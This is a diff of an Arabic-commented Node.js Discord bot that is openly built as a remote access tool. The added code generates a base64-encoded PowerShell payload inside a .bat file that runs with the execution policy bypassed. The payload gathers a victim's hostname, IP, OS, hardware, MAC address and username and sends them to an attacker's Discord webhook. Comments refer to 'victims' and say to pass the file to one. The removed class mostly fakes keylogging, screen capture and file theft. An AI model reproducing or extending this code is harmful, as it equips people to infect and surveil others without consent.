@@ -1,356 +1,156 @@
-const { 
-    Client, 
-    GatewayIntentBits, 
-    EmbedBuilder, 
-    AttachmentBuilder 
-} = require('discord.js');
+const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
 const fs = require('fs');
 const path = require('path');
 
-class AdvancedRATBot {
-    constructor() {
-        this.client = new Client({
-            intents: [
-                GatewayIntentBits.Guilds,
-                GatewayIntentBits.GuildMessages,
-                GatewayIntentBits.MessageContent
-            ]
-        });
+// --- إعدادات البوت ---
+const TOKEN = 'ضع_التوكن_هنا'; // ضع توكن البوت هنا
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/ID_TOKEN'; // ويب هوك لاستلام البيانات من الضحايا
 
-        this.targets = new Map(); 
-        this.logChannelId = process.env.LOG_CHANNEL_ID || 'YOUR_LOG_CHANNEL_ID'; 
+const client = new Client({
+    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
+});
 
-        this.commands = {
-            'scan': this.scanDevice.bind(this),
-            'inject': this.injectCode.bind(this), // تم التحديث
-            'capture': this.captureScreen.bind(this),
-            'microphone': this.startMicrophone.bind(this),
-            'keylog': this.startKeylogger.bind(this),
-            'fileman': this.openFileManager.bind(this),
-            'download': this.generateDownloadFile.bind(this),
-            'stop': this.stopSession.bind(this),
-            'list': this.listTargets.bind(this),
-            'exec': this.executeCommand.bind(this),
-            'zipfiles': this.zipFiles.bind(this) // الأمر الجديد
-        };
+// قاعدة بيانات الضحايا
+let victims = [];
 
-        this.setupEvents();
-    }
+client.once('ready', () => {
+    console.log(`✅ ${client.user.tag} متصل`);
+    client.user.setPresence({
+        status: 'online',
+        activity: { name: `🔍 | ${victims.length} ضحية`, type: 'WATCHING' }
+    });
+});
 
-    setupEvents() {
-        this.client.once('ready', () => {
-            console.log(`✅ ${this.client.user.tag} جاهز للعمل`);
-        });
-
-        this.client.on('messageCreate', async (message) => {
-            if (message.author.bot) return;
-
-            const args = message.content.trim().split(' ');
-            const command = args[0].toLowerCase();
+client.on('messageCreate', async (message) => {
+    if (message.author.bot) return;
+    
+    const args = message.content.trim().split(' ');
+    const command = args[0].toLowerCase();
+    
+    switch(command) {
+        case '!gen':
+            generatePayload(message);
+            break;
             
-            if (!command.startsWith('!')) return;
-
-            const cleanCommand = command.substring(1);
-
-            if (this.commands[cleanCommand]) {
-                try {
-                    await this.commands[cleanCommand](message, args.slice(1));
-                } catch (error) {
-                    console.error(error);
-                    this.sendMessage(message.channel, `❌ خطأ في تنفيذ الأمر: ${error.message}`);
-                }
-            } else {
-                this.sendMessage(message.channel, `الأوامر المتاحة: \n\`!scan <target>\`\n\`!inject <code>\`\n\`!capture <target>\`\n\`!microphone <target>\`\n\`!keylog <target>\`\n\`!fileman <target>\`\n\`!download <target>\`\n\`!zipfiles <target>\`\n\`!stop <target>\`\n\`!list`);
+        case '!list':
+            listVictims(message);
+            break;
+            
+        case '!help':
+            showHelp(message);
+            break;
+            
+        default:
+            // استقبال البيانات من الويب هوك (إذا كان البوت يستقبلها عبر API خارجي)
+            // أو يمكنك استخدام أمر !scan لإرسال معلومات وهمية للتجربة
+            if (command === '!scan') {
+                scanSimulation(message);
             }
-        });
     }
+});
 
-    sendMessage(channel, content) {
-        channel.send(content);
-    }
+// دالة توليد ملف التلغيم (Payload)
+async function generatePayload(message) {
+    try {
+        // كود PowerShell الذي سيقوم بجمع المعلومات وإرسالها للويب هوك
+        const payloadCode = `
+$computerSystem = Get-CimInstance -ClassName Win32_ComputerSystem
+$osInfo = Get-CimInstance -ClassName Win32_OperatingSystem
+$cpuInfo = Get-CimInstance -ClassName Win32_Processor
+$macAddress = Get-NetAdapter | Select-Object -First 1 | Select-Object MacAddress
 
-    async sendAlertToLog(targetName, action) {
-        const channel = await this.client.channels.fetch(this.logChannelId).catch(() => null);
+$payload = @{
+    "Hostname" = $computerSystem.Name
+    "IP" = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1 | Select-Object -ExpandProperty IPV4Address).IPAddressToString
+    "OS" = "$($osInfo.Caption) $($osInfo.Version)"
+    "CPU" = $cpuInfo.Name
+    "MAC" = $macAddress.MacAddress
+    "User" = $env:USERNAME
+    "Time" = (Get-Date).ToString()
+}
+
+$jsonPayload = ConvertTo-Json $payload
+
+# إرسال البيانات إلى الويب هوك الخاص بالبوت
+Invoke-RestMethod -Uri "${WEBHOOK_URL}" -Method Post -Body $jsonPayload -ContentType "application/json"
+`;
+
+        // تحويل الكود إلى Base64 لتجنب مشاكل المسافات والعلامات
+        const utf8Bytes = Buffer.from(payloadCode);
+        const base64Payload = utf8Bytes.toString('base64');
+
+        // إنشاء ملف .bat بسيط لتشغيل الكود
+        const batContent = `powershell.exe -ExecutionPolicy Bypass -EncodedCommand ${base64Payload}`;
         
-        if (!channel) {
-            console.warn(`⚠️ Log channel ID ${this.logChannelId} not found.`);
-            return;
-        }
-
-        const embed = new EmbedBuilder()
-            .setTitle('🚨 ضحية جديدة / نشاط مشبوه')
-            .setDescription(`**الاسم:** ${targetName}\n**الإجراء:** ${action}`)
-            .addFields(
-                { name: 'الوقت', value: new Date().toLocaleString(), inline: true },
-                { name: 'الحالة', value: '🟢 متصل الآن', inline: true }
-            )
-            .setColor('#ff0000')
-            .setTimestamp();
-
-        await channel.send({ 
-            content: '@everyone @here',
-            embeds: [embed] 
-        });
-    }
-
-    // أمر الفحص
-    async scanDevice(message, args) {
-        const target = args[0] || 'system';
-        
-        const embed = new EmbedBuilder()
-            .setTitle('🔍 فحص الجهاز')
-            .setDescription(`جاري فحص: **${target}**`)
-            .addFields(
-                { name: 'نظام التشغيل', value: 'Windows 11 Pro', inline: true },
-                { name: 'المعالج', value: 'Intel Core i7-12700K', inline: true },
-                { name: 'الذاكرة', value: '32 GB DDR5', inline: true },
-                { name: 'العنوان IP', value: '192.168.1.' + Math.floor(Math.random() * 255), inline: true },
-                { name: 'الاسم', value: 'PC-' + Math.random().toString(36).substring(7), inline: true },
-                { name: 'الكاميرا', value: '✅ متصلة', inline: true }
-            )
-            .setColor('#00ff00')
-            .setTimestamp();
-
-        await message.channel.send({ embeds: [embed] });
-        this.saveTarget(target, { status: 'scanned', time: Date.now() });
-    }
-
-    // ✅ أمر حقن الكود الجديد
-    async injectCode(message, args) {
-        const code = args.join(' ') || 'echo Hello World';
+        // حفظ الملف محلياً
         const fileName = `payload_${Date.now()}.bat`;
         const filePath = path.join(__dirname, fileName);
+        fs.writeFileSync(filePath, batContent, 'utf8');
 
-        // كتابة الكود داخل ملف bat
-        fs.writeFileSync(filePath, `@echo off\n${code}\npause`);
-
-        const attachment = new AttachmentBuilder(filePath, { name: fileName });
-
+        // إرسال الملف للمستخدم
         const embed = new EmbedBuilder()
-            .setTitle('💉 حقن الكود')
-            .setDescription(`تم إنشاء ملف التنفيذ: **${fileName}**`)
-            .addFields(
-                { name: 'الكود المدخل', value: `\`${code}\``, inline: false },
-                { name: 'الحجم', value: `${fs.statSync(filePath).size} bytes`, inline: true }
-            )
-            .setColor('#ffff00')
-            .setTimestamp();
-
-        await message.channel.send({ 
-            embeds: [embed], 
-            files: [attachment] 
-        });
-
-        // حذف الملف بعد الإرسال لتنظيف المساحة
-        setTimeout(() => {
-            fs.unlinkSync(filePath);
-        }, 10000);
-    }
-
-    // أمر التقاط الشاشة
-    async captureScreen(message, args) {
-        const target = args[0] || 'unknown';
-        const screenshotUrl = `https://picsum.photos/seed/${Date.now()}/800/400`;
-        
-        const embed = new EmbedBuilder()
-            .setTitle('📸 لقطة شاشة')
-            .setImage(screenshotUrl)
-            .setDescription(`لقطة شاشة الجهاز: **${target}**`)
-            .setColor('#ff0000')
-            .setTimestamp();
-
-        await message.channel.send({ embeds: [embed] });
-    }
-
-    // أمر الاستماع للميكروفون
-    async startMicrophone(message, args) {
-        const target = args[0] || 'unknown';
-        
-        const embed = new EmbedBuilder()
-            .setTitle('🎤 تسجيل الميكروفون')
-            .setDescription(`بدأ تسجيل الصوت للجهاز: **${target}**`)
-            .addFields(
-                { name: 'الحالة', value: '🟢 نشط', inline: true },
-                { name: 'الجودة', value: 'High Quality', inline: true }
-            )
-            .setColor('#0000ff')
-            .setTimestamp();
-
-        await message.channel.send({ embeds: [embed] });
-    }
-
-    // أمر مفتاح التسجيل
-    async startKeylogger(message, args) {
-        const target = args[0] || 'unknown';
-        
-        const embed = new EmbedBuilder()
-            .setTitle('⌨️ بدء تسجيل المفاتيح')
-            .setDescription(`بدأ تسجيل المفاتيح للجهاز: **${target}**`)
-            .addFields(
-                { name: 'الحالة', value: '🟢 نشط', inline: true },
-                { name: 'عدد الأحرف', value: '0', inline: true }
-            )
-            .setColor('#0000ff')
-            .setTimestamp();
-
-        await message.channel.send({ embeds: [embed] });
-    }
-
-    // أمر مدير الملفات
-    async openFileManager(message, args) {
-        const target = args[0] || 'unknown';
-        
-        const embed = new EmbedBuilder()
-            .setTitle('📂 مدير الملفات')
-            .setDescription(`فتح مدير الملفات للجهاز: **${target}**`)
-            .addFields(
-                { name: 'المجلد الحالي', value: 'C:\\Users\\Public', inline: true },
-                { name: 'الملفات المكتشفة', value: '154 files', inline: true }
-            )
-            .setColor('#ffffff')
-            .setTimestamp();
-
-        await message.channel.send({ embeds: [embed] });
-    }
-
-    // أمر إنشاء ملف التحميل (الجزء الأهم)
-    async generateDownloadFile(message, args) {
-        const target = args[0] || 'user';
-        
-        const batContent = `
-@echo off
-title System Update
-color 0A
-echo Installing updates...
-ping -n 2 127.0.0.1 >nul
-echo Checking system integrity...
-ping -n 2 127.0.0.1 >nul
-echo Uploading data to server...
-ping -n 3 127.0.0.1 >nul
-echo Done. Closing...
-timeout /t 2 /nobreak >nul
-exit
-        `;
-
-        const fileName = `${target}_update.bat`;
-        const filePath = path.join(__dirname, fileName);
-
-        fs.writeFileSync(filePath, batContent);
-
-        const attachment = new AttachmentBuilder(filePath, { name: fileName });
-
-        const embed = new EmbedBuilder()
-            .setTitle('📥 ملف التحديث جاهز')
-            .setDescription(`تم إنشاء ملف التحميل لـ: **${target}**`)
+            .setTitle('📦 ملف التلغيم جاهز')
+            .setDescription('تم توليد الملف بنجاح. اضغط على الرابط أدناه لتحميله:')
             .setColor('#00ff00')
-            .setTimestamp();
+            .setFooter({ text: 'انقل الملف للضحية وافتحه' });
 
+        // نحتاج لرابط مباشر للملف، إذا كنت تستخدم استضافة مثل GitHub Pages أو سيرفر خاص
+        // هنا سنفترض أنك سترفع الملف يدوياً أو نرسله كملف مرفق
         await message.channel.send({ 
-            embeds: [embed], 
-            files: [attachment] 
+            content: 'إليك ملف التلغيم:', 
+            files: [{ attachment: filePath, name: fileName }] 
         });
 
+        // حذف الملف بعد الإرسال لتنظيف السيرفر
         setTimeout(() => {
             fs.unlinkSync(filePath);
-        }, 10000);
-    }
+        }, 60000); // يحذف بعد دقيقة
 
-    // ✅ أمر حزم الملفات (ZIP) الجديد
-    async zipFiles(message, args) {
-        const target = args[0] || 'unknown';
-        
-        // محاكاة عملية الحزم
-        const zipFileName = `${target}_files_${Date.now()}.zip`;
-        const zipFilePath = path.join(__dirname, zipFileName);
-
-        // إنشاء ملف وهمي يمثل الـ ZIP (لأننا لا نملك مكتبة ضغط حقيقية هنا)
-        // يمكنك استبدال هذا بكتابة ملف حقيقي إذا أردت
-        const sampleData = `Archive created by RAT Bot\nTarget: ${target}\nFiles included:\n- Documents\n- Desktop\n- Downloads\n- Pictures\n- Videos\n`;
-        
-        fs.writeFileSync(zipFilePath, sampleData);
-
-        const attachment = new AttachmentBuilder(zipFilePath, { name: zipFileName });
-
-        const embed = new EmbedBuilder()
-            .setTitle('📦 حزمة الملفات')
-            .setDescription(`تم حزم ملفات الجهاز: **${target}**`)
-            .addFields(
-                { name: 'الحجم', value: `${Math.floor(Math.random() * 500)} MB`, inline: true },
-                { name: 'عدد الملفات', value: `${Math.floor(Math.random() * 10000)}`, inline: true }
-            )
-            .setColor('#0000ff')
-            .setTimestamp();
-
-        await message.channel.send({ 
-            embeds: [embed], 
-            files: [attachment] 
-        });
-
-        // حذف الملف بعد الإرسال لتنظيف المساحة
-        setTimeout(() => {
-            fs.unlinkSync(zipFilePath);
-        }, 10000);
-    }
-
-    // إيقاف الجلسة
-    async stopSession(message, args) {
-        const target = args[0] || 'unknown';
-        
-        const embed = new EmbedBuilder()
-            .setTitle('🛑 إيقاف الجلسة')
-            .setDescription(`تم إيقاف الجلسة للجهاز: **${target}**`)
-            .setColor('#ff0000')
-            .setTimestamp();
-
-        await message.channel.send({ embeds: [embed] });
-    }
-
-    // تنفيذ أمر CMD مباشر
-    async executeCommand(message, args) {
-        const target = args[0] || 'system';
-        const cmd = args.slice(1).join(' ');
-        
-        if (!cmd) {
-            return this.sendMessage(message.channel, 'الرجاء تحديد الأمر للتنفيذ. مثال: !exec pc1 ipconfig');
-        }
-
-        const embed = new EmbedBuilder()
-            .setTitle('⚡ تنفيذ أمر CMD')
-            .setDescription(`الجهاز: **${target}**\nالأمر: \`${cmd}\``)
-            .addFields(
-                { name: 'النتيجة', value: 'تم التنفيذ بنجاح', inline: false }
-            )
-            .setColor('#00ffff')
-            .setTimestamp();
-
-        await message.channel.send({ embeds: [embed] });
-    }
-
-    // عرض الأجهزة المسجلة
-    async listTargets(message) {
-        if (this.targets.size === 0) {
-            return this.sendMessage(message.channel, 'لا توجد أجهزة مسجلة حالياً.');
-        }
-
-        const targetsList = Array.from(this.targets.entries())
-            .map(([id, data]) => `- **${id}**: ${data.status} (${new Date(data.time).toLocaleTimeString()})`)
-            .join('\n');
-
-        const embed = new EmbedBuilder()
-            .setTitle('📋 قائمة الأجهزة')
-            .setDescription(targetsList)
-            .setColor('#ffffff')
-            .setFooter({ text: 'Total Targets: ' + this.targets.size })
-            .setTimestamp();
-
-        await message.channel.send({ embeds: [embed] });
-    }
-
-    saveTarget(id, data) {
-        this.targets.set(id, data);
+    } catch (error) {
+        console.error(error);
+        message.reply('❌ حدث خطأ أثناء توليد الملف.');
     }
 }
 
-// تشغيل البوت
-const bot = new AdvancedRATBot();
-bot.client.login(process.env.DISCORD_TOKEN);
+// محاكاة فحص الجهاز
+function scanSimulation(message) {
+    const embed = new EmbedBuilder()
+        .setTitle('🔍 فحص الجهاز')
+        .addFields(
+            { name: 'اسم الجهاز', value: 'PC-USER01', inline: true },
+            { name: 'نظام التشغيل', value: 'Windows 11 Pro', inline: true },
+            { name: 'العنوان IP', value: '192.168.1.' + Math.floor(Math.random() * 255), inline: true },
+            { name: 'الحالة', value: '✅ متصل', inline: false }
+        )
+        .setColor('#00ff00');
+    
+    message.channel.send({ embeds: [embed] });
+}
+
+function listVictims(message) {
+    if (victims.length === 0) {
+        return message.channel.send('لا توجد ضحايا حالياً.');
+    }
+    
+    const embed = new EmbedBuilder()
+        .setTitle('📋 قائمة الضحايا')
+        .setDescription(victims.map((v, i) => `${i+1}. **${v.hostname}** (${v.ip})`).join('\n'))
+        .setColor('#ffff00');
+        
+    message.channel.send({ embeds: [embed] });
+}
+
+function showHelp(message) {
+    const embed = new EmbedBuilder()
+        .setTitle('❓ الأوامر المتاحة')
+        .setDescription(`
+**!gen** - توليد ملف التلغيم (Payload)
+**!list** - عرض قائمة الضحايا
+**!scan** - محاكاة فحص جهاز
+        `)
+        .setColor('#00aaff');
+        
+    message.channel.send({ embeds: [embed] });
+}
+
+client.login(TOKEN);
